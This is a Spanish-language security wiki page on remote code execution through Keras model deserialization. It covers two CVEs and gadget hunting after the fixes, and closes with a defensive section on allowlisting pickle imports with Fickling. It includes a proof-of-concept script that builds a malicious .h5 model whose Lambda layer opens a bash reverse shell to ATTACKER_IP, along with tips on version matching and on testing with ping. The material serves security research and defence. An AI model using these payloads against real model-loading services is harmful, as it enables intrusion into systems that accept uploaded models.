# Deserialización de modelos Keras, RCE y búsqueda de gadgets

{{#include ../../banners/hacktricks-training.md}}

Esta página resume técnicas prácticas de explotación contra el pipeline de deserialización de modelos Keras, explica los componentes internos y la superficie de ataque del formato nativo `.keras`, y proporciona un toolkit para investigadores que buscan Model File Vulnerabilities (MFVs) y gadgets posteriores a una corrección.

## Componentes internos del formato de modelo `.keras`

Un archivo `.keras` es un archivo ZIP que contiene como mínimo:<sup>[[1]](#references)</sup>
- metadata.json – información genérica (por ejemplo, la versión de Keras)
- config.json – arquitectura del modelo (superficie de ataque principal)
- model.weights.h5 – pesos en HDF5

El archivo `config.json` controla la deserialización recursiva: Keras importa módulos, resuelve clases/funciones y reconstruye capas/objetos a partir de diccionarios controlados por el atacante.<sup>[[1]](#references)</sup>

Ejemplo de un fragmento para un objeto de capa Dense:
```json
{
"module": "keras.layers",
"class_name": "Dense",
"config": {
"units": 64,
"activation": {
"module": "keras.activations",
"class_name": "relu"
},
"kernel_initializer": {
"module": "keras.initializers",
"class_name": "GlorotUniform"
}
}
}
```
La deserialización realiza:<sup>[[1]](#references)</sup>
- Importación de módulos y resolución de símbolos a partir de las claves module/class_name
- Invocación de from_config(...) o del constructor con kwargs controlados por el atacante
- Recursión en objetos anidados (activations, initializers, constraints, etc.)

Históricamente, esto exponía tres primitivas a un atacante que creara config.json:<sup>[[1]](#references)</sup>
- Control de los módulos que se importan
- Control de las clases/funciones que se resuelven
- Control de los kwargs pasados a los constructores/from_config

## CVE-2024-3660 – Lambda-layer bytecode RCE

Causa raíz:
- Lambda.from_config() utilizaba python_utils.func_load(...), que realiza una decodificación base64 y llama a marshal.loads() sobre bytes controlados por el atacante; el unmarshalling de Python puede ejecutar código.<sup>[[1]](#references)[[3]](#references)</sup>

Idea del exploit (payload simplificado en config.json):
```json
{
"module": "keras.layers",
"class_name": "Lambda",
"config": {
"name": "exploit_lambda",
"function": {
"function_type": "lambda",
"bytecode_b64": "<attacker_base64_marshal_payload>"
}
}
}
```
Mitigación:
- Keras aplica safe_mode=True de forma predeterminada. Las funciones Python serializadas en Lambda se bloquean, a menos que el usuario opte explícitamente por desactivar esta protección con safe_mode=False.<sup>[[1]](#references)</sup>

Notas:
- Los formatos heredados (guardados HDF5 antiguos) o las bases de código antiguas pueden no aplicar las comprobaciones modernas, por lo que los ataques de tipo “downgrade” aún pueden ser aplicables cuando las víctimas utilizan loaders antiguos.

## CVE-2025-1550 – Importación arbitraria de módulos en Keras ≤ 3.8

Causa raíz:
- _retrieve_class_or_fn utilizaba importlib.import_module() sin restricciones con cadenas de módulos controladas por el atacante desde config.json.
- Impacto: importación arbitraria de cualquier módulo instalado (o de un módulo colocado por el atacante en sys.path). El código en tiempo de importación se ejecuta y, posteriormente, se realiza la construcción del objeto con kwargs controlados por el atacante.<sup>[[1]](#references)[[4]](#references)[[5]](#references)[[6]](#references)</sup>

Idea del exploit:
```json
{
"module": "maliciouspkg",
"class_name": "Danger",
"config": {"arg": "val"}
}
```
Mejoras de seguridad (Keras ≥ 3.9):<sup>[[1]](#references)[[2]](#references)</sup>
- Allowlist de módulos: las importaciones están restringidas a módulos del ecosistema oficial: keras, keras_hub, keras_cv, keras_nlp
- Modo seguro predeterminado: safe_mode=True bloquea la carga insegura de funciones serializadas de Lambda
- Comprobación básica de tipos: los objetos deserializados deben coincidir con los tipos esperados

## Explotación práctica: RCE de Lambda en TensorFlow-Keras HDF5 (.h5)

Muchas stacks de producción todavía aceptan archivos de modelo HDF5 heredados de TensorFlow-Keras (.h5). Si un atacante puede subir un modelo que el servidor cargue posteriormente o utilice para ejecutar inferencia, una capa Lambda puede ejecutar Python arbitrario durante load/build/predict.<sup>[[7]](#references)</sup>

PoC mínimo para crear un archivo .h5 malicioso que ejecute un reverse shell al deserializarse o utilizarse:
```python
import tensorflow as tf

def exploit(x):
import os
os.system("bash -c 'bash -i >& /dev/tcp/ATTACKER_IP/PORT 0>&1'")
return x

m = tf.keras.Sequential()
m.add(tf.keras.layers.Input(shape=(64,)))
m.add(tf.keras.layers.Lambda(exploit))
m.compile()
m.save("exploit.h5")  # legacy HDF5 container
```
Notas y consejos de fiabilidad:
- Puntos de activación: el código puede ejecutarse varias veces (por ejemplo, durante la creación de la capa/primera llamada, `model.load_model` y `predict`/`fit`). Haz que los payloads sean idempotentes.<sup>[[7]](#references)</sup>
- Fijación de versiones: haz coincidir el TF/Keras/Python de la víctima para evitar incompatibilidades de serialización. Por ejemplo, crea artefactos con Python 3.8 y TensorFlow 2.13.1 si eso es lo que utiliza el objetivo.<sup>[[7]](#references)</sup>
- Replicación rápida del entorno:
```dockerfile
FROM python:3.8-slim
RUN pip install tensorflow-cpu==2.13.1
```
- Validation: un payload benigno como os.system("ping -c 1 YOUR_IP") ayuda a confirmar la ejecución (p. ej., observando ICMP con tcpdump) antes de cambiar a un reverse shell.<sup>[[7]](#references)</sup>

## Superficie de gadgets posterior a la corrección dentro de la allowlist

Incluso con allowlisting y safe mode, sigue existiendo una superficie amplia entre los callables permitidos de Keras. Por ejemplo, keras.utils.get_file puede descargar URLs arbitrarias en ubicaciones seleccionadas por el usuario.<sup>[[1]](#references)</sup>

Gadget mediante Lambda que referencia una función permitida (sin serializar bytecode de Python):
```json
{
"module": "keras.layers",
"class_name": "Lambda",
"config": {
"name": "dl",
"function": {"module": "keras.utils", "class_name": "get_file"},
"arguments": {
"fname": "artifact.bin",
"origin": "https://example.com/artifact.bin",
"cache_dir": "/tmp/keras-cache"
}
}
}
```
Limitación importante:
- Lambda.call() antepone el tensor de entrada como el primer argumento posicional al invocar el callable objetivo. Los gadgets elegidos deben tolerar un argumento posicional adicional (o aceptar *args/**kwargs). Esto limita qué funciones son viables.<sup>[[1]](#references)</sup>

## Allowlisting de imports de pickle para modelos de AI/ML (Fickling)

Muchos formatos de modelos de AI/ML (PyTorch .pt/.pth/.ckpt, joblib/scikit-learn, artefactos antiguos de TensorFlow, etc.) integran datos de Python pickle. Los atacantes abusan habitualmente de los imports GLOBAL de pickle y de los constructores de objetos para lograr RCE o sustituir modelos durante la carga. Los scanners basados en listas negras suelen pasar por alto imports peligrosos nuevos o no incluidos en la lista.<sup>[[8]](#references)[[14]](#references)</sup>

Una defensa práctica fail-closed consiste en aplicar un hook al deserializador pickle de Python y permitir únicamente un conjunto revisado de imports inofensivos relacionados con ML durante la deserialización. Fickling, de Trail of Bits, implementa esta política e incluye un allowlist de imports de ML seleccionado a partir de miles de pickles públicos de Hugging Face.<sup>[[8]](#references)[[13]](#references)</sup>

Modelo de seguridad para imports “seguros” (intuiciones extraídas de la investigación y la práctica): los símbolos importados utilizados por un pickle deben cumplir simultáneamente lo siguiente:<sup>[[8]](#references)</sup>
- No ejecutar código ni provocar su ejecución (sin objetos de código compilados o de código fuente, ejecución de comandos externos, hooks, etc.)
- No obtener ni establecer atributos o elementos arbitrarios
- No importar ni obtener referencias a otros objetos de Python desde la VM de pickle
- No activar ningún deserializador secundario (por ejemplo, marshal o un pickle anidado), ni siquiera indirectamente

Activa las protecciones de Fickling lo antes posible durante el inicio del proceso para que se compruebe cualquier carga de pickle realizada por los frameworks (torch.load, joblib.load, etc.):<sup>[[9]](#references)</sup>
```python
import fickling
# Sets global hooks on the stdlib pickle module
fickling.hook.activate_safe_ml_environment()
```
Consejos operativos:
- Puedes deshabilitar/reactivar temporalmente los hooks cuando sea necesario:<sup>[[9]](#references)</sup>
```python
fickling.hook.deactivate_safe_ml_environment()
# ... load fully trusted files only ...
fickling.hook.activate_safe_ml_environment()
```
- Si un modelo de confianza es bloqueado, amplía la allowlist de tu entorno después de revisar los símbolos:<sup>[[9]](#references)</sup>
```python
fickling.hook.activate_safe_ml_environment(also_allow=[
"package.subpackage.safe_symbol",
"another.safe.import",
])
```
- Fickling también expone runtime guards genéricos si prefieres un control más granular:<sup>[[9]](#references)</sup>
- fickling.always_check_safety() para imponer comprobaciones en todas las llamadas a pickle.load()
- with fickling.check_safety(): para imponer comprobaciones con alcance limitado
- fickling.load(path) / fickling.is_likely_safe(path) para comprobaciones puntuales

- Prefiere formatos de modelos que no sean pickle cuando sea posible (por ejemplo, SafeTensors).<sup>[[15]](#references)</sup> Si debes aceptar pickle, ejecuta los loaders con el mínimo privilegio, sin network egress, y aplica la allowlist.

Esta estrategia allowlist-first bloquea de forma demostrable las rutas de explotación comunes de ML basadas en pickle, a la vez que mantiene una alta compatibilidad. En el benchmark de ToB, Fickling detectó el 100 % de los archivos maliciosos sintéticos y permitió aproximadamente el 99 % de los archivos limpios de los principales repos de Hugging Face.<sup>[[8]](#references)[[10]](#references)</sup>


## Toolkit del researcher

1) Descubrimiento sistemático de gadgets en módulos permitidos

Enumera los callables candidatos en keras, keras_nlp, keras_cv, keras_hub y prioriza aquellos con efectos secundarios sobre archivos, network, procesos o el entorno.<sup>[[1]](#references)</sup>

<details>
<summary>Enumera los callables potencialmente peligrosos en los módulos de Keras incluidos en la allowlist</summary>
```python
import importlib, inspect, pkgutil

ALLOWLIST = ["keras", "keras_nlp", "keras_cv", "keras_hub"]

seen = set()

def iter_modules(mod):
if not hasattr(mod, "__path__"):
return
for m in pkgutil.walk_packages(mod.__path__, mod.__name__ + "."):
yield m.name

candidates = []
for root in ALLOWLIST:
try:
r = importlib.import_module(root)
except Exception:
continue
for name in iter_modules(r):
if name in seen:
continue
seen.add(name)
try:
m = importlib.import_module(name)
except Exception:
continue
for n, obj in inspect.getmembers(m):
if inspect.isfunction(obj) or inspect.isclass(obj):
sig = None
try:
sig = str(inspect.signature(obj))
except Exception:
pass
doc = (inspect.getdoc(obj) or "").lower()
text = f"{name}.{n} {sig} :: {doc}"
# Heuristics: look for I/O or network-ish hints
if any(x in doc for x in ["download", "file", "path", "open", "url", "http", "socket", "env", "process", "spawn", "exec"]):
candidates.append(text)

print("\n".join(sorted(candidates)[:200]))
```
</details>

2) Direct deserialization testing (no .keras archive needed)

Introduce diccionarios manipulados directamente en los deserializadores de Keras para conocer los parámetros aceptados y observar los efectos secundarios.<sup>[[1]](#references)</sup>
```python
from keras import layers

cfg = {
"module": "keras.layers",
"class_name": "Lambda",
"config": {
"name": "probe",
"function": {"module": "keras.utils", "class_name": "get_file"},
"arguments": {"fname": "x", "origin": "https://example.com/x"}
}
}

layer = layers.deserialize(cfg, safe_mode=True)  # Observe behavior
```
3) Sondeo entre versiones y formatos

Keras existe en varios codebases/eras con distintas salvaguardas y formatos:<sup>[[1]](#references)</sup>
- TensorFlow built-in Keras: tensorflow/python/keras (legacy, prevista para eliminarse)
- tf-keras: mantenido por separado
- Multi-backend Keras 3 (official): introdujo el formato .keras nativo

Repite las pruebas en los distintos codebases y formatos (.keras frente a HDF5 legacy) para descubrir regresiones o salvaguardas ausentes.

## Referencias

- [1] [Búsqueda de vulnerabilidades en la deserialización de modelos Keras (blog de huntr)](https://blog.huntr.com/hunting-vulnerabilities-in-keras-model-deserialization)
- [2] [Keras PR #20751 – Se añadieron comprobaciones a la serialización](https://github.com/keras-team/keras/pull/20751)
- [3] [CVE-2024-3660 – RCE mediante deserialización de Lambda en Keras](https://nvd.nist.gov/vuln/detail/CVE-2024-3660)
- [4] [CVE-2025-1550 – Importación arbitraria de módulos en Keras (≤ 3.8)](https://nvd.nist.gov/vuln/detail/CVE-2025-1550)
- [5] [informe de huntr – importación arbitraria n.º 1](https://huntr.com/bounties/135d5dcd-f05f-439f-8d8f-b21fdf171f3e)
- [6] [informe de huntr – importación arbitraria n.º 2](https://huntr.com/bounties/6fcca09c-8c98-4bc5-b32c-e883ab3e4ae3)
- [7] [HTB Artificial – RCE mediante Lambda de TensorFlow .h5 hasta root](https://0xdf.gitlab.io/2025/10/25/htb-artificial.html)
- [8] [blog de Trail of Bits – El nuevo scanner de archivos pickle de AI/ML de Fickling](https://blog.trailofbits.com/2025/09/16/ficklings-new-ai/ml-pickle-file-scanner/)
- [9] [Fickling – Protección de entornos de AI/ML (README)](https://github.com/trailofbits/fickling#securing-aiml-environments)
- [10] [Corpus de benchmark de scanning de pickle de Fickling](https://github.com/trailofbits/fickling/tree/master/pickle_scanning_benchmark)
- [11] [Picklescan](https://github.com/mmaitre314/picklescan)
- [12] [ModelScan](https://github.com/protectai/modelscan)
- [13] [model-unpickler](https://github.com/goeckslab/model-unpickler)
- [14] [Contexto de los ataques Sleepy Pickle](https://blog.trailofbits.com/2024/06/11/exploiting-ml-models-with-pickle-file-attacks-part-1/)
- [15] [Proyecto SafeTensors](https://github.com/safetensors/safetensors)

{{#include ../../banners/hacktricks-training.md}}
